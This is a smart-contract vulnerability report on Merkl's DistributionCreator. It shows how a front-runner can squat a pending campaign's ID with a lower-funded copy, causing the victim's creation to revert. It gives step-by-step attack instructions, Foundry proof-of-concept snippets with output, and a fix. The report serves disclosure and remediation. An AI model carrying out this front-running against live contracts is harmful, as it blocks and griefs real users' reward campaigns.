# Campaign ID can be front-run and squatted with a lower reward amount

## Finding Metadata

| Field              | Value                                                                                                                          |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------ |
| Target project     | [Merkl](https://github.com/code-423n4/2025-11-merkl)                                                                           |
| Affected contract  | [`contracts/DistributionCreator.sol`](https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/DistributionCreator.sol) |
| Vulnerability type | Front-running / deterministic campaign ID squatting                                                                            |
| Severity           | Medium                                                                                                                         |
| Proof of concept   | [HUODONGREN/front-run_0day Issue #2](https://github.com/HUODONGREN/front-run_0day/issues/2)                                    |

## Summary

`DistributionCreator` generates each campaign ID from the campaign creator, reward token, campaign type, start timestamp, duration, and campaign data.

However, the campaign reward `amount` is not included in the ID calculation.

An attacker can observe a victim's pending high-value campaign transaction, copy all ID-defining parameters, reduce only the reward amount, and submit the campaign with higher execution priority.

Because both campaigns generate the same `campaignId`, the attacker creates the lower-value campaign first. The victim's later transaction then reverts with `CampaignAlreadyExists`.

## Vulnerable Code

The campaign ID is calculated without including `campaignData.amount`:

[`DistributionCreator.sol#L353-L372`](https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/DistributionCreator.sol#L353-L372)

```solidity
function campaignId(
    CampaignParameters memory campaignData
) public view returns (bytes32) {
    return bytes32(
        keccak256(
            abi.encodePacked(
                CHAIN_ID,
                campaignData.creator,
                campaignData.rewardToken,
                campaignData.campaignType,
                campaignData.startTimestamp,
                campaignData.duration,
                campaignData.campaignData
            )
        )
    );
}
```

During campaign creation, the resulting ID is checked against `_campaignLookup`. If the ID has already been registered, the transaction reverts:

[`DistributionCreator.sol`](https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/DistributionCreator.sol)

```solidity
newCampaign.amount = campaignAmountMinusFees;
newCampaign.campaignId = campaignId(newCampaign);

if (_campaignLookup[newCampaign.campaignId] != 0) {
    revert Errors.CampaignAlreadyExists();
}

_campaignLookup[newCampaign.campaignId] =
    campaignList.length + 1;

campaignList.push(newCampaign);
emit NewCampaign(newCampaign);
```

## Root Cause

The campaign reward amount is excluded from the deterministic campaign ID:

```text
campaignId = keccak256(
    chainId,
    creator,
    rewardToken,
    campaignType,
    startTimestamp,
    duration,
    campaignData
)
```

Therefore, two campaigns with different reward amounts produce the same ID when all other fields are identical:

```text
campaignId(victimCampaign)
    ==
campaignId(attackerCampaign)
```

The result depends on transaction ordering:

```text
Victim campaign → Attacker campaign
    = victim creates the intended campaign

Attacker campaign → Victim campaign
    = attacker occupies the ID
    = victim reverts
```

## Attack Steps

1. The victim prepares a campaign with a reward amount of `1000e18`.
2. The victim submits `createCampaign()` through the public mempool.
3. The attacker observes the pending transaction.
4. The attacker copies the following parameters:

```text
creator
rewardToken
campaignType
startTimestamp
duration
campaignData
```

5. The attacker changes only the reward amount:

```text
Victim amount:   1000e18
Attacker amount:   24e18
```

6. Because `amount` is excluded from `campaignId()`, both campaigns produce the same ID.
7. The attacker submits the lower-value campaign with higher execution priority.
8. The attacker's campaign executes first and occupies the campaign ID.
9. The attacker funds only the smaller `24e18` campaign.
10. The victim's original `1000e18` campaign executes afterward.
11. The victim's transaction reverts with:

```text
CampaignAlreadyExists()
```

## Proof of Concept

The complete Foundry PoC is available at:

[PoC — `HUODONGREN/front-run_0day#2`](https://github.com/HUODONGREN/front-run_0day/issues/2)

The relevant PoC test is:

```text
test_FrontRun_CampaignIdSquatting_FlattenedContract
```

The test constructs two campaigns:

```solidity
CampaignParameters memory victimCampaign =
    _buildBaseCampaign(1000e18);

CampaignParameters memory attackerCampaign =
    _buildBaseCampaign(24e18);
```

It then confirms that both campaigns produce the same ID:

```solidity
bytes32 victimCampaignId =
    distributionCreator.campaignId(victimCampaign);

bytes32 attackerCampaignId =
    distributionCreator.campaignId(attackerCampaign);

assertEq(
    victimCampaignId,
    attackerCampaignId,
    "Campaign ID collision confirmed"
);
```

The attacker creates the low-value campaign first:

```solidity
vm.prank(attacker);

distributionCreator.createCampaign(
    attackerCampaign
);
```

The victim's later campaign creation is expected to revert:

```solidity
vm.prank(victim);
vm.expectRevert(
    Errors.CampaignAlreadyExists.selector
);

distributionCreator.createCampaign(
    victimCampaign
);
```

## Reproduction Steps

Create a Foundry project:

```bash
mkdir distribution-creator-front-run-poc
cd distribution-creator-front-run-poc

forge init --force
```

Install `forge-std`:

```bash
forge install foundry-rs/forge-std
```

Remove the default Foundry files:

```bash
rm -f src/Counter.sol
rm -f test/Counter.t.sol
rm -f script/Counter.s.sol
```

Place the flattened target contract at:

```text
src/DistributionCreator_flattened.sol
```

Save the PoC code from Issue #2 as:

```text
test/DistributionCreatorExactFrontRun.t.sol
```

The import in the PoC should be:

```solidity
import "../src/DistributionCreator_flattened.sol";
```

Configure `foundry.toml`:

```toml
[profile.default]
src = "src"
test = "test"
libs = ["lib"]

solc_version = "0.8.17"
optimizer = true
optimizer_runs = 200
```

Compile the project:

```bash
forge clean
forge build
```

Run the campaign ID squatting test:

```bash
forge test \
  --match-test test_FrontRun_CampaignIdSquatting_FlattenedContract \
  -vvvv
```

The expected result is:

```text
[PASS] test_FrontRun_CampaignIdSquatting_FlattenedContract()
```

## PoC Result

The victim and attacker campaigns produce the same campaign ID:

```text
Victim campaignId:
0x650bc2de1db0160f8f691e1b1a39b0b8960292de0bda5ea142b1994ad7a1933d

Attacker campaignId:
0x650bc2de1db0160f8f691e1b1a39b0b8960292de0bda5ea142b1994ad7a1933d
```

The attacker successfully creates the campaign using only:

```text
24000000000000000000
```

reward tokens.

The distributor receives the attacker's `24e18` reward amount, and the attacker occupies the victim's intended campaign ID.

The victim's later campaign creation with `1000e18` reverts with:

```text
CampaignAlreadyExists()
```

## Impact

An attacker can squat the deterministic campaign ID of a pending campaign using a smaller reward amount.

This can:

* block the victim's intended campaign creation;
* replace a high-value campaign with a low-value campaign;
* cause the victim's transaction to revert;
* waste the victim's transaction gas;
* prevent reuse of the same campaign parameters;
* disrupt scheduled reward distributions.

## Severity

**Medium**

The vulnerability allows an unprivileged attacker to prevent the creation of a victim's intended campaign by occupying its deterministic ID with a lower-value campaign.

The attacker must provide a valid minimum reward amount, but this amount can be significantly lower than the victim's intended campaign funding.

## Recommendation

Include the campaign reward amount in the campaign ID calculation:

```solidity
function campaignId(
    CampaignParameters memory campaignData
) public view returns (bytes32) {
    return keccak256(
        abi.encode(
            CHAIN_ID,
            campaignData.creator,
            campaignData.rewardToken,
            campaignData.amount,
            campaignData.campaignType,
            campaignData.startTimestamp,
            campaignData.duration,
            campaignData.campaignData
        )
    );
}
```

A creator-specific nonce or salt can also be included:

```solidity
keccak256(
    abi.encode(
        CHAIN_ID,
        campaignData.creator,
        creatorNonce[campaignData.creator],
        campaignData.rewardToken,
        campaignData.amount,
        campaignData.campaignType,
        campaignData.startTimestamp,
        campaignData.duration,
        campaignData.campaignData
    )
);
```

A commit-reveal mechanism may be used when campaign parameters must remain hidden until creation.

## References

* [Merkl repository](https://github.com/code-423n4/2025-11-merkl)
* [`DistributionCreator.sol`](https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/DistributionCreator.sol)
* [`campaignId()`](https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/DistributionCreator.sol#L353-L372)
* [Foundry PoC — Issue #2](https://github.com/HUODONGREN/front-run_0day/issues/2)
